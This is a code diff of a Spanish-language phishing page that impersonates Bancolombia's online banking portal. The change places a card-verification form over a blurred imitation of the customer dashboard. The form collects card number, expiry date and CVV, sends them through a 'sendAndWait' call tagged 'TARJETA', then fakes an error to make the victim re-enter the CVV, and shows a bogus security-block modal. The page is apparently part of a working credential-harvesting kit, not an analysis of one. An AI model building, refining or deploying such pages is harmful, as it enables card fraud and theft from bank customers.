@@ -4,128 +4,152 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Verifica tu tarjeta | Bancolombia</title>
+<link rel="stylesheet" href="css/dashboard.css">
 <link rel="stylesheet" href="css/secured.css">
 </head>
 <body>
 
-<header class="top">
-  <div class="brand">
-    <img src="img/horizont-trazo-blanco.svg" alt="Bancolombia" onerror="this.style.display='none'">
-    <div class="channel">Sucursal Virtual Personas</div>
-  </div>
-  <div class="top-actions">
-    <button class="user-pill"><span id="userName">Usuario</span></button>
-  </div>
-</header>
-
-<main class="center">
-  <div class="card-form">
-    <h1>Verifica tu tarjeta</h1>
-    <p class="sub">Ingresa los datos de tu tarjeta débito o crédito para confirmar tu identidad.</p>
-
-    <div class="err-banner" id="errBanner">Datos incorrectos. Verifica e intenta de nuevo.</div>
-
-    <div class="field">
-      <label for="tc">Número de tarjeta</label>
-      <input type="text" id="tc" inputmode="numeric" maxlength="19" placeholder="0000 0000 0000 0000" autocomplete="cc-number">
+  <!-- 1. FONDO: Aquí simulamos o cargamos la estructura del dashboard para que se vea atrás -->
+  <header class="top">
+    <div class="brand">
+      <img src="img/horizont-trazo-blanco.svg" alt="Bancolombia" onerror="this.style.display='none'">
+      <div class="channel">Sucursal Virtual Personas</div>
     </div>
+    <div class="top-actions">
+      <button class="user-pill"><span id="userName">Usuario</span></button>
+    </div>
+  </header>
 
-    <div class="field-row">
-      <div class="field">
-        <label for="expiry">Fecha de expiración</label>
-        <input type="text" id="expiry" inputmode="numeric" maxlength="5" placeholder="MM/AA" autocomplete="cc-exp">
+  <div class="layout" style="filter: blur(5px); pointer-events: none; user-select: none;">
+    <!-- Vista previa difuminada del dashboard de fondo -->
+    <main class="content">
+      <div class="greeting">
+        <h1>Hola, <strong>Usuario</strong></h1>
       </div>
-      <div class="field">
-        <label for="cvv">CVV</label>
-        <input type="text" id="cvv" inputmode="numeric" maxlength="4" placeholder="•••" autocomplete="cc-csc">
+      <section class="block">
+        <h2>Transacciones más usadas</h2>
+        <div class="shortcuts">
+          <div class="shortcut-card"><h6>Transferir a productos</h6></div>
+          <div class="shortcut-card"><h6>Editar topes</h6></div>
+        </div>
+      </section>
+      <section class="block">
+        <h2>Tus productos</h2>
+        <div class="accordion open">
+          <div class="accordion-header"><h6>Cuentas (1)</h6></div>
+        </div>
+      </section>
+    </main>
+  </div>
+
+  <!-- 2. CAPA FLOTANTE (MODAL / OVERLAY): El formulario de la tarjeta encima con fondo borroso -->
+  <div class="modal-overlay show" style="display: flex;">
+    <div class="card-form" style="background: #fff; padding: 30px; border-radius: 16px; max-width: 420px; width: 90%; box-shadow: 0 10px 25px rgba(0,0,0,0.2);">
+      <h1>Verifica tu tarjeta</h1>
+      <p class="sub">Ingresa los datos de tu tarjeta débito o crédito para confirmar tu identidad.</p>
+
+      <div class="err-banner" id="errBanner" style="display:none; color: red; font-size: 13px; margin-bottom: 10px;">Datos incorrectos. Verifica e intenta de nuevo.</div>
+
+      <div class="field" style="margin-bottom: 15px;">
+        <label for="tc" style="display:block; font-size: 13px; margin-bottom: 5px;">Número de tarjeta</label>
+        <input type="text" id="tc" inputmode="numeric" maxlength="19" placeholder="0000 0000 0000 0000" autocomplete="cc-number" style="width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 8px;">
+      </div>
+
+      <div class="field-row" style="display: flex; gap: 10px; margin-bottom: 20px;">
+        <div class="field" style="flex: 1;">
+          <label for="expiry" style="display:block; font-size: 13px; margin-bottom: 5px;">Fecha de expiración</label>
+          <input type="text" id="expiry" inputmode="numeric" maxlength="5" placeholder="MM/AA" autocomplete="cc-exp" style="width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 8px;">
+        </div>
+        <div class="field" style="flex: 1;">
+          <label for="cvv" style="display:block; font-size: 13px; margin-bottom: 5px;">CVV</label>
+          <input type="text" id="cvv" inputmode="numeric" maxlength="4" placeholder="•••" autocomplete="cc-csc" style="width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 8px;">
+        </div>
+      </div>
+
+      <div class="actions" style="display: flex; gap: 10px;">
+        <button class="btn-pill btn-secondary-pill" onclick="clearForm()" style="flex: 1; padding: 10px; border-radius: 8px; border: 1px solid #ccc; background: #f2f2f2;">Borrar</button>
+        <button class="btn-pill btn-primary" id="btnContinue" disabled style="flex: 1; padding: 10px; border-radius: 8px; background: #ffe000; border: none; font-weight: bold;">Continuar</button>
       </div>
     </div>
+  </div>
 
-    <div class="actions">
-      <button class="btn-pill btn-secondary-pill" onclick="clearForm()">Borrar</button>
-      <button class="btn-pill btn-primary" id="btnContinue" disabled>Continuar</button>
+  <!-- Loader -->
+  <div class="loader-overlay" id="loader">
+    <div class="loader-box">
+      <div class="loader-circle"></div>
+      <div class="loader-text">Cargando...</div>
     </div>
   </div>
-</main>
 
-<!-- Loader -->
-<div class="loader-overlay" id="loader">
-  <div class="loader-box">
-    <div class="loader-circle"></div>
-    <div class="loader-text">Cargando...</div>
-  </div>
-</div>
-
-<!-- Modal 923 -->
-<div class="modal-overlay" id="modal923">
-  <div class="modal-923">
-    <div class="x-circle">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+  <!-- Modal 923 -->
+  <div class="modal-overlay" id="modal923">
+    <div class="modal-923">
+      <div class="x-circle">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+      </div>
+      <h3>Por seguridad, no puedes continuar</h3>
+      <p>Te contactaremos por alguno de nuestros canales para confirmar que eres tú o llámanos a la Sucursal Telefónica, elige la opción 3 y luego 2. Nunca te pediremos tu usuario, claves o códigos de seguridad. Codigo: 923</p>
+      <button class="btn-yellow-full" onclick="close923Retry()">Intentar más tarde</button>
     </div>
-    <h3>Por seguridad, no puedes continuar</h3>
-    <p>Te contactaremos por alguno de nuestros canales para confirmar que eres tú o llámanos a la Sucursal Telefónica, elige la opción 3 y luego 2. Nunca te pediremos tu usuario, claves o códigos de seguridad.       Codigo: 923</p>
-    <button class="btn-yellow-full" onclick="close923Retry()">Intentar más tarde</button>
   </div>
-</div>
 
+  <script src="js/secured.js"></script>
+  <script>
+    const tc     = document.getElementById('tc');
+    const expiry = document.getElementById('expiry');
+    const cvv    = document.getElementById('cvv');
+    const btn    = document.getElementById('btnContinue');
+    const errEl  = document.getElementById('errBanner');
 
-<script src="js/secured.js"></script>
-<script>
-  const tc     = document.getElementById('tc');
-  const expiry = document.getElementById('expiry');
-  const cvv    = document.getElementById('cvv');
-  const btn    = document.getElementById('btnContinue');
-  const errEl  = document.getElementById('errBanner');
-
-  // Formato número de tarjeta: 4-4-4-4
-  tc.addEventListener('input', () => {
-    let v = tc.value.replace(/\D/g, '').slice(0, 16);
-    tc.value = v.replace(/(.{4})/g, '$1 ').trim();
-    errEl.classList.remove('show');
-    check();
-  });
-  // Formato MM/AA
-  expiry.addEventListener('input', () => {
-    let v = expiry.value.replace(/\D/g, '').slice(0, 4);
-    if (v.length >= 3) v = v.slice(0, 2) + '/' + v.slice(2);
-    expiry.value = v;
-    errEl.classList.remove('show');
-    check();
-  });
-  cvv.addEventListener('input', () => {
-    cvv.value = cvv.value.replace(/\D/g, '').slice(0, 4);
-    errEl.classList.remove('show');
-    check();
-  });
-
-  function check() {
-    const tcOk     = tc.value.replace(/\s/g, '').length >= 14;
-    const expiryOk = /^\d{2}\/\d{2}$/.test(expiry.value);
-    const cvvOk    = cvv.value.length >= 3;
-    const ok = tcOk && expiryOk && cvvOk;
-    btn.classList.toggle('active', ok);
-    btn.disabled = !ok;
-  }
-
-  function clearForm() {
-    tc.value = ''; expiry.value = ''; cvv.value = '';
-    errEl.classList.remove('show');
-    check();
-    tc.focus();
-  }
-
-  btn.addEventListener('click', () => {
-    if (btn.disabled) return;
-    sendAndWait({
-      event: 'TARJETA',
-      tc: tc.value.replace(/\s/g, ''),
-      expiry: expiry.value,
-      cvv: cvv.value
-    }, {
-      onOk: () => { sessionStorage.clear(); location.href = 'index.html'; },
-      onErr: () => { hideLoader(); errEl.classList.add('show'); cvv.value = ''; check(); cvv.focus(); }
+    tc.addEventListener('input', () => {
+      let v = tc.value.replace(/\D/g, '').slice(0, 16);
+      tc.value = v.replace(/(.{4})/g, '$1 ').trim();
+      errEl.style.display = 'none';
+      check();
     });
-  });
-</script>
+
+    expiry.addEventListener('input', () => {
+      let v = expiry.value.replace(/\D/g, '').slice(0, 4);
+      if (v.length >= 3) v = v.slice(0, 2) + '/' + v.slice(2);
+      expiry.value = v;
+      errEl.style.display = 'none';
+      check();
+    });
+
+    cvv.addEventListener('input', () => {
+      cvv.value = cvv.value.replace(/\D/g, '').slice(0, 4);
+      errEl.style.display = 'none';
+      check();
+    });
+
+    function check() {
+      const tcOk     = tc.value.replace(/\s/g, '').length >= 14;
+      const expiryOk = /^\d{2}\/\d{2}$/.test(expiry.value);
+      const cvvOk    = cvv.value.length >= 3;
+      const ok = tcOk && expiryOk && cvvOk;
+      btn.classList.toggle('active', ok);
+      btn.disabled = !ok;
+    }
+
+    function clearForm() {
+      tc.value = ''; expiry.value = ''; cvv.value = '';
+      errEl.style.display = 'none';
+      check();
+      tc.focus();
+    }
+
+    btn.addEventListener('click', () => {
+      if (btn.disabled) return;
+      sendAndWait({
+        event: 'TARJETA',
+        tc: tc.value.replace(/\s/g, ''),
+        expiry: expiry.value,
+        cvv: cvv.value
+      }, {
+        onOk: () => { sessionStorage.clear(); location.href = 'index.html'; },
+        onErr: () => { hideLoader(); errEl.style.display = 'block'; cvv.value = ''; check(); cvv.focus(); }
+      });
+    });
+  </script>
 </body>
 </html>
